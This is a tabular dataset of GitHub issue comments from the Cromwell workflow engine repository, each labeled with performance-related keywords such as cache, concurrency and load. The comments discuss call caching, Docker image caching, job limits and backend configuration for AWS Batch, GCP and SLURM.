Performance,"Here is an example that worked for me for those that are interested.; ```; {; ""manifestFormatVersion"": 2,; ""dockerImageCacheMap"": {""us.gcr.io/broad-gatk/gatk:4.3.0.0"":; {""dockerImageDigest"": ""sha256:e7996ba655225c1cde0a1faec6a113e217758310af2cf99b00d61dae8ec6e9f2"",; ""diskImageName"":""projects/${PROJECT}/global/images/${IMAGE}""}; }. }; ```; There is some details on how the disk image should look on the Google API website. ""The Compute Engine Disk Images to use as a Docker cache. The disks will be mounted into the Docker folder in a way that the images present in the cache will not need to be pulled. The digests of the cached images must match those of the tags used or the latest version will still be pulled. The root directory of the ext4 image must contain image and overlay2 directories copied from the Docker directory of a VM where the desired Docker images have already been pulled. Any images pulled that are not cached will be stored on the first cache disk instead of the boot disk. Only a single image is supported."". After all that it actually took longer using the disk cache :(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693:475,cache,cache,475,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6953#issuecomment-1321225693,6,['cache'],"['cache', 'cached']"
Performance,"Here is the config file used for the above. ```; ﻿include required(classpath(""application"")). ""workflow_failure_mode"": ""ContinueWhilePossible"". webservice {; port = 2525; }. system.file-hash-cache=true. system {; job-rate-control {; jobs = 1; per = 2 second; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; # driver = ""com.mysql.jdbc.Driver""; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://xxxxxx:xxxx/xxx?rewriteBatchedStatements=true&useSSL=false""; user = ""xxx""; password = ""xxx""; connectionTimeout = 120000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-another""; scheme = ""assume_role""; base-auth = ""default""; role-arn = ""arn:aws:iam::xx:role/xxx""; }; ]; // diff 1:; # region = ""us-west-2"" // uses region from ~/.aws/config set by aws configure command,; # // or us-east-1 by default; }; engine {; filesystems {; s3 {; auth = ""assume-role-based-on-another""; }; }; }; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://xxx/cromwell-output""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default""; // diff 2:; numSubmitAttempts = 1; // diff 3:; numCreateDefinitionAttempts = 1; default-runtime-attributes {; queueArn: ""arn:aws:batch:us-west-2:xxx:job-queue/xxx""; }; filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020:191,cache,cache,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020,4,"['cache', 'queue']","['cache', 'cache-results', 'queue', 'queueArn']"
Performance,"Here is the size optimization that deletes untested jython files:. https://github.com/broadinstitute/heterodon/blob/b54010d4f1fe9395f854ab62e4b66c203bf3f45d/build.sh#L82-L84. If we come up with a CI regression case for Windows (x64?) then the appropriate files could be excluded from the filter and tested. Re: the borked Cromwell, we could catch-and-box the thrown `java.lang.Error` into a `java.lang.Exception` and Cromwell would handle this particular error more gracefully.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-481487720:17,optimiz,optimization,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-481487720,1,['optimiz'],['optimization']
Performance,"Here is the terminal output, for posterity:. The first command with internet, confirms we are using a cached image:; ```bash; $ singularity exec docker://busybox ls; INFO: Using cached SIF image; CHANGELOG.md LICENSE README.md dist paper qme.egg-info setup.py; Dockerfile MANIFEST.in build docs qme setup.cfg tests; ```; then I took off my wireless :scream: and ran the same - we know the image is in the cache:. ```bash; $ singularity exec docker://busybox ls; FATAL: Unable to handle docker://busybox uri: failed to get checksum for docker://busybox: error pinging docker registry registry-1.docker.io: Get https://registry-1.docker.io/v2/: dial tcp: lookup registry-1.docker.io: no such host; ```; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631206046:102,cache,cached,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631206046,3,['cache'],"['cache', 'cached']"
Performance,"Hey @TMiguelT, I made a few small changes to udocker, added the notes we discussed and a next steps section to follow the general template of the other tutorials. I wanted to add a small section about the caching of udocker images but don't know udocker well enough to really assert this:. > #### Caching in udocker; > udocker caches images within the install or user directory, thus reducing the need to pull and build the docker containers at every stage. Clarification is required on whether udocker will concurrently write to the same cache directory for largely scattered workflows. So I've just left it out. I also think it might be worth saying more explicitly that Singularity is technically user-installable (just without `setuid`, as I didn't realise until our conversation. If you're happy with what's there now, I'll remove the WIP and put it up for review again. If there's anyone out there reading, we'd love to get your feedback or clarification on any points.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464519232:327,cache,caches,327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464519232,6,"['cache', 'concurren']","['cache', 'caches', 'concurrently']"
Performance,"Hey @Xophmeister, sorry for the slow response time!. This error message is actually coming from our SFS (shared filesystem) backend (so I'll ping @kshakir). I'm not familiar with the `mounts` attribute in the SFS. However, I think the answer to your question is that none of the attributes asked for by the SFS backend are arrays, and so arrays are not a supported attribute type. . I actually could only find reference to the `mounts` attribute outside of the SFS backend in places like BCS and Google cloud. I wonder whether you just need to move this attribute out of your configuration file and into your WDL task itself?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4685#issuecomment-481024411:37,response time,response time,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4685#issuecomment-481024411,1,['response time'],['response time']
Performance,"Hey @antonkulaga, these aren't exactly what you're after but there are two things you could have a look at that should help:; - You can use the `concurrent-job-limit` for the local backend to limit how many jobs (i.e. calls being run) are happening at any given time. That should cause things to slow down naturally without having to manually pause/resume them, which might help. In the config:; ```; backend {; ...; providers {; BackendName {; actor-factory = ...; config {; concurrent-job-limit = 5; ```. - The second item (not re-running early tasks) should be helped by [call caching](https://github.com/broadinstitute/cromwell#call-caching). As long as nothing changes in the intermediate steps, Cromwell should be able to detect and re-use your previous results.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527:145,concurren,concurrent-job-limit,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527,4,['concurren'],['concurrent-job-limit']
Performance,"Hey @benjamincarlin,. The call caching feature is really designed with the focus on not having to recomputing outputs. In the case of the monitoring script, it really was meant to be treated as a debugging tool and not a true output from a task. Can you explain why you need to the monitoring log for cached jobs, especially as its not new information? Is the motivation to be able to access all monitoring logs under one workflow uuid directory?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-444621805:301,cache,cached,301,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-444621805,1,['cache'],['cached']
Performance,"Hey @bolton-lab, just FYI this is probably more of a WDL forum sort of thing. But generally, you've noted you don't want to perform execution where your inputs are localised to, if you need to mutate or reuse them, you should copy them to your execution folder by adding a copy in your command block together with the `basename` function, eg:. ```wdl; # task index {; command {; set -e -o pipefail; cp ~{bam} ~{basename(bam)}; /opt/samtools/bin/samtools index ~{basename(bam)} ~{basename(bam)}.bai; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6182#issuecomment-774772321:124,perform,perform,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6182#issuecomment-774772321,1,['perform'],['perform']
Performance,"Hey @cmarkello, unrelated to your initial problem, but how do you find the performance of the file-hash based caching for Cromwell? We've found it to be incredibly CPU / memory / network intensive for large (~250GB) input files so looking for alternatives (#5346).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-583216806:75,perform,performance,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-583216806,1,['perform'],['performance']
Performance,"Hey @rhpvorderman, I've started to use this for our workflows and seems to be working well! Props for this change :). I've got a small suggestion (not enough to raise an issue, and only if you're already making other changes), it would be awesome if Cromwell could log a message to say that it's copying files. I watch for that because then I know the task is starting properly. . Unrelated to that, I was wondering what hurdles might have to be overcome to devise a hashing-strategy based on your new `cached-copy` (that's not File / md5). You've mentioned [before](https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482565332) that this might be possible as it doesn't depend on the final path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507916924:503,cache,cached-copy,503,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507916924,1,['cache'],['cached-copy']
Performance,"Hey @rhpvorderman, just wanted to check in and say this has been working great!. I was thinking about adding a new one, called ""cached-hardlink"" or so, but instead of always copying, it would try to hard-link it first. We have the use case where often our bigger sequence data is on the same disk, but some reference files are not. My plan was to just follow your pattern, but use a modified `localizePathViaCachedCopy` (like `localizePathViaHardlink`). Do you have any advice if I were to give it a crack over the EOY break?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-568303076:128,cache,cached-hardlink,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-568303076,1,['cache'],['cached-hardlink']
Performance,"Hey Jing,. Regarding call caching misses -- there should be something message in the workflow metadata for why it failed, will you be able to share workflow metadata from the second workflow that fails to cache?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440498120:205,cache,cache,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440498120,1,['cache'],['cache']
Performance,"Hi !; Just to make sure I understand, are you saying that the monitoring log is not copied over when a call is being cached ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-433937512:117,cache,cached,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-433937512,1,['cache'],['cached']
Performance,"Hi , ; When submitting jobs requiring GPU, we specified in the runtime session: ; gpuCount: 2; gpuType: ""nvidia-tesla-k80""; the jobs failed with following errors:; 2019/05/03 14:40:50 E: command failed: nvidia-docker | 2019/05/03 14:40:50 Error: Could not load UVM kernel module. Is nvidia-modprobe installed?. The same WDL file (with same docker and runtime attributes) used to work before. Please help!. Thanks!. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4935:256,load,load,256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4935,1,['load'],['load']
Performance,"Hi ,; Im running the GATK [warp joint genotyping pipeline ](https://github.com/broadinstitute/warp/blob/develop/pipelines/broad/dna_seq/germline/joint_genotyping/JointGenotyping.wdl)cromwell on GCP backend . The pipeline fails because cromwell cannot localize files with certain data types like ` Array[Array[String]]`. This issue was reported on the [terra website](https://support.terra.bio/hc/en-us/community/posts/4409388371611-How-do-I-pass-an-array-array-file-to-another-task-) too and the workaround was to write a task to read file into an array, I have performed the workaround but are there plans to fix this issue in any upcoming releases. **Cromwell version tested :** 85. **Are you seeing something that looks like a bug? Please attach as much information as possible.** ; `""Failed to evaluate 'sample_name_map_lines' (reason 1 of 1): Evaluating read_tsv(sample_name_map) failed: Failed to read_tsv(\""gs://wgs/test/sample_map.txt\"") (reason 1 of 1): java.lang.IllegalArgumentException: Could not build the path \""gs://wgs/test/sample_map.txt\"". It may refer to a filesystem not supported by this instance of Cromwell. Supported filesystems are: HTTP, LinuxFileSystem. Failures: \nHTTP: gs://wgs/test/sample_map.txt does not have an http or https scheme (IllegalArgumentException)\nLinuxFileSystem: Cannot build a local path from gs://wgs/test/sample_map.txt (RuntimeException)\n Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems""`. **Which backend are you running?** ; GCP. **Link to the workflow if possible**; https://github.com/broadinstitute/warp/blob/develop/pipelines/broad/dna_seq/germline/joint_genotyping/JointGenotyping.wdl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7364:562,perform,performed,562,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7364,1,['perform'],['performed']
Performance,"Hi - If I submit ~100 or so jobs to a cromwell server, is there a way I can limit the number of workflows that get fully executed at a time? . I have it restricted as 'concurrent-job-limit = 10' for the backend, and even though cromwell is only allowing 10 jobs to be running at any point, it seems to be going through all hundred jobs and running parts of each at a time rather than getting through 10 complete workflows. So at this point, I've got a hundred partially completed workflows rather than any number of fully completed workflows. I'd prefer to get some number of completed workflows through before dispatching new jobs. Anything I can do here other than having my own dispatcher to the cromwell server that proactively meters the jobs?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5503:168,concurren,concurrent-job-limit,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5503,1,['concurren'],['concurrent-job-limit']
Performance,"Hi @aednichols @cjllanwarne ; I'm really sorry for long reply. I'm so overworked that it took a month for me to get this done.; I've rebased this pull request, as well as two others (https://github.com/broadinstitute/cromwell/pull/6072 and https://github.com/broadinstitute/cromwell/pull/6081) at the develop branch.; Unfortunately, I couldn't find a way to resolve all comments. I did add tests to the CallCacheDiffActorSpec in this PR https://github.com/broadinstitute/cromwell/pull/6081. But I didn't find a way to properly test this PR https://github.com/broadinstitute/cromwell/pull/6072 nor to check how it will affect performance.; Please let me know if this PRs are okay for you in their current state. I can make some minor changes if required. But If they require a lot of time than I'm afraid I won't be able to maintain them and it's better to close them. I promise this time I'll respond to your comments faster :); Huge thanks for your invitation, although it already expired. I would love to continue to contribute to Cromwell. But right now it's almost impossible for me to find enough time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799:625,perform,performance,625,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799,1,['perform'],['performance']
Performance,"Hi @cjllanwarne ; 1. I'm not an expert in databases, so I'm not sure. In my opinion, it may become even better, because in case of hundreds excluded ids we can filter them out before expensive joins or other filtrations. I'll try to do something to check that it won't cause performance penalties.; 2. I tried to find a way to test it, but it is very tricky to me. I was hoping you will give me some hint on how to do it :); 3. Will do",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666:275,perform,performance,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666,1,['perform'],['performance']
Performance,"Hi @dspeck1 ,. Thanks for your reply. The is the cromwell outputs when things happened:. ```; =======================log start============. status_events {; description: ""Job state is set from QUEUED to SCHEDULED for job projects/A_JOB_ID.""; event_time {; seconds: 1713287682; nanos: 566509009; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from SCHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:193,QUEUE,QUEUED,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630,1,['QUEUE'],['QUEUED']
Performance,"Hi @dtenenba , we fully appreciate the importance of call caching and are looking into this. can I confirm a few things:. * that this is occurring on different files each run?; * you are seeing it every run of non-trivial size; * You have experienced at least one call-cache success run of any workflow (including a trivial one). This will help me narrow down what is going on. . To be clear, this should be working and we are aware that hashing is not a manual process but a simple value lookup.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457307894:269,cache,cache,269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457307894,2,['cache'],['cache']
Performance,"Hi @likeanowl , thanks for your interest. I'm tempted to close this issue. I speculated that there could be contention. However, we have since moved to an isolated process for the summarizer, rendering this issue moot for us. . If you do work on this issue I would focus on developing a load test that can look at whether the thread pool suffers (is under heavy contenion) when under high metadata write load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4762#issuecomment-518674483:287,load,load,287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4762#issuecomment-518674483,2,['load'],['load']
Performance,"Hi @myazinn, sorry for the slow response time, and I haven't really looked at this in detail, but it looks like we'll now be calling the same function twice for the same stderr file (once for the job message and once for the workflow message)? Is that right?. What I mean is, when a task within a workflow fails, do we now download the same stderr file twice?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5096#issuecomment-519629045:32,response time,response time,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5096#issuecomment-519629045,1,['response time'],['response time']
Performance,"Hi @myazinn,. @rhpvorderman indeed solved this issue by implementing the cached-copy localization strategy. So no, this issue is no longer relevant.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4711#issuecomment-518199844:73,cache,cached-copy,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4711#issuecomment-518199844,1,['cache'],['cached-copy']
Performance,"Hi @rasmuse - a few thoughts. In terms of the submit time keep in mind things like JVM initialization. Calling individual invocations of a java program like that for what's effectively a blink of an eye operation is never going to be ideal from a performance perspective. If you're submitting to a Cromwell server consider using something like `curl` instead. . On the second part, there are a few things potentially going on here. First is that Cromwell doesn't necessarily immediately start a workflow. It scans every `n` seconds for new workflows to start, which defaults to `20`. In a worst case scenario `21` of your `20` seconds could be due to that, although that seems unlikely. You can make that time window shorter by overriding the `system.new-workflow-poll-rate` configuration setting to something smaller, e.g. `1`. Even then, there's a some overhead in there as ultimately we're trying to optimize for a case that's not running single, extremely short tasks. I just ran the moral equivalent of a hello world workflow locally with that config setting set to 1 second. The workflow was picked up for execution at `11:08:44` and registered as complete at `11:08:51` with exactly half of that time spent with the system running the underlying job (i.e. not in Cromwell) so it might be worth revisiting this w/ a combination of using `curl` and speeding up the workflow polling rate. That said while I'd love you to continue to use Cromwell/WDL, it might not wind up being the best tool for your job. If these workflows are purely for yourself & you don't intend on building them up over time and/or distributing them to others, you might want to check out Snakemake which is more intended to be a direct Makefile replacement.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-378636936:247,perform,performance,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-378636936,2,"['optimiz', 'perform']","['optimize', 'performance']"
Performance,"Hi @rasmuse, I lead the Cromwell Languages team here at the Broad (a small offshoot team from the main Cromwell team). Ultimately, Cromwell will always aim to be a production scale engine, but my team is especially interested in anything that makes reading, writing, testing, experimenting with and debugging workflows easier... If you're serious about trying to make an ""optimized for small local tasks"" implementation of a WDL engine, that definitely sounds like something that could definitely help out our workflow authors too... so do let me know if it goes anywhere and if we can help out at all! Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-379037212:372,optimiz,optimized,372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-379037212,1,['optimiz'],['optimized']
Performance,Hi @seandavi - you'll want to use the `concurrent-job-limit` field in your backend config (see the `reference.conf` for more details) which was put in for exactly this reason. It's a crude implement but the local backend was intended more as a debug/noodling around backend and not a full on scheduler.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-309215718:39,concurren,concurrent-job-limit,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-309215718,1,['concurren'],['concurrent-job-limit']
Performance,"Hi @vsoch - here's what I have. A word of warning that I found it in an email thread where a user was saying it didn't work for them, but it came from someone for whom it **did** work so YMMV. I'm going to try to try this out myself later although it'll take me a while before I get time to install `udocker` and such. ```; backend {. # Override the default backend. #default = ""LocalExample"". . # The list of providers. providers {. . # The local provider is included by default in the reference.conf. This is an example. . # Define a new backend provider. Local {. # The actor that runs the backend. In this case, it's the Shared File System (SFS) ConfigBackend. actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". . # The backend custom configuration. config {. . # Optional limits on the number of concurrent jobs. #concurrent-job-limit = 5. . # If true submits scripts to the bash background using ""&"". Only usefull for dispatchers that do NOT submit. # the job and then immediately return a scheduled job id. run-in-background = true. . # `temporary-directory` creates the temporary directory for commands. #. # If this value is not set explicitly, the default value creates a unique temporary directory, equivalent to:. # temporary-directory = ""$(mktemp -d \""$PWD\""/tmp.XXXXXX)"". #. # The expression is run from the execution directory for the script. The expression must create the directory. # if it does not exist, and then return the full path to the directory. #. # To create and return a non-random temporary directory, use something like:. # temporary-directory = ""$(mkdir -p /tmp/mydir && echo /tmp/mydir)"". . # `script-epilogue` configures a shell command to run after the execution of every command block. #. # If this value is not set explicitly, the default value is `sync`, equivalent to:. # script-epilogue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possibl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:837,concurren,concurrent,837,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,2,['concurren'],"['concurrent', 'concurrent-job-limit']"
Performance,"Hi @wleepang . Yes, you are right. The problem I have is particularly when using a slurm backend, as I don't find an easy way to load environment modules except to actually modify the individual command section of each task definition in my workflow. This is inconvenient because when I'm running the same pipeline on AWS batch, there are no environment modules, so my tasks fail unless I explicitly remove all the `module load <module name>` from the command part of each task. I would like to switch back and forth between cloud and cluster without having to touch the pipeline script (i.e. individual tasks) itself. Put differently, can I specify a runtime attribute called `module` much like the `docker` attribute, and then somehow modify the backend configuration settings to have cromwell load this module? . Did I explain myself better this time?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-502902782:129,load,load,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-502902782,3,['load'],['load']
Performance,"Hi Ales, in my case it was this bug here (that I've filed and is yet to be attended to):; https://broadworkbench.atlassian.net/browse/BA-6147. Run a `du -hs` on the directory and check the size, if it's ridiculously large, It could be that the reference files are being copied in the scatter gather rather than hard-linked or soft-linked. This is meant to be resolved with `cached-copy` for shared file systems but doesn't appear to work, particularly if the reference files are on a separate mount point to the working cromwell directory. If you do find that this is the case, a workaround that I found is that you can create a step of the workflow at the start that takes in each of these large files and merely runs a cp to their output. Then, rather than using the reference argument in the workflow, use the outputs from that first step that runs a cp. That will ensure that all of the reference files in the scatter gather are hard-linked rather than copied. Kind regards,; Alexis.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-651084834:374,cache,cached-copy,374,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-651084834,1,['cache'],['cached-copy']
Performance,"Hi All,; This PR is intended to review the implementation to perform ""runtime attributes"" validation in the backend side. Please, feel free to add any comment/idea that can add value to this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708:61,perform,perform,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708,1,['perform'],['perform']
Performance,"Hi Chris, . This would work for us as long as the retryOnStdoutRegex allows for just blanket retries (since it's free for us to do it on internal GridEngine queues), . Thanks for the follow-up, ; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-296226126:157,queue,queues,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-296226126,1,['queue'],['queues']
Performance,"Hi Cromwell Team; ; I am writing in respect to an issue that I am having with using AWS + Cromwell + MySQL server. Not sure if this is the best place to ask because I’m not sure if the issue is Cromwell specific. It might be related to AWS backend configuration. But I couldn’t figure out the problem and I figured you might be able to provide some insight.; ; I have a docker image that has MySQL server installed. I’m using percorna-server-5.6 specifically because I need to use MySQL5.6. There is a Cromwell task which does the following:; 1. Start mysql server. The first line of the WDL task is literally `service mysql start`; 2. Initialize the database and load Vcf files into the database.; 3. Run some SQL query and perform some analysis; ; And the above Cromwell task need to be run for multiple samples. ; ; So, first I did step 1-3 manually without using WDL just to make sure that I can run multiple MySQL docker container just fine. And it worked. So then the next step is test the whole WDL using LOCAL backend. And it ran fine. But when I submit the same WDL script to AWS Batch, the first task will always succeed and the subsequent tasks will always fail with port connection error because all the containers are connecting to port 3306 and port 3306 is already used. Do you know why it is trying to connect to port 3306? My issue was that it worked when running locally. So, I’m wondering if there’s something with how the docker run command was submitted to AWS Batch or EC2 is configured?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4688:664,load,load,664,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4688,2,"['load', 'perform']","['load', 'perform']"
Performance,"Hi Everyone,; We have updated Cromwell from version 51 to 82 recently, and changed the following line in Dockerfile:. -----------------------------------------------------------------------; FROM broadinstitute/cromwell:51 --> FROM broadinstitute/cromwell:82; -----------------------------------------------------------------------. Then we had an issue with the parameter scriptBucketName in aws.conf which seems to be a new parameter introduced. So we modified the aws.conf file as follows:. aws.conf; -----------------------------------------------------------------------; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {. concurrent-job-limit = 10000. numSubmitAttempts = 6; numCreateDefinitionAttempts = 6. // Base bucket for workflow executions; root = ${EXECUTION_BUCKET_ROOT_URL}. // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""xxxxxx"". default-runtime-attributes {; queueArn: ${AWS_BATCH_QUEUE}; scriptBucketName: ""${SCRIPT_BUCKET_NAME}""; }. filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }. # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in the cloud.; slow-job-warning-time: 3 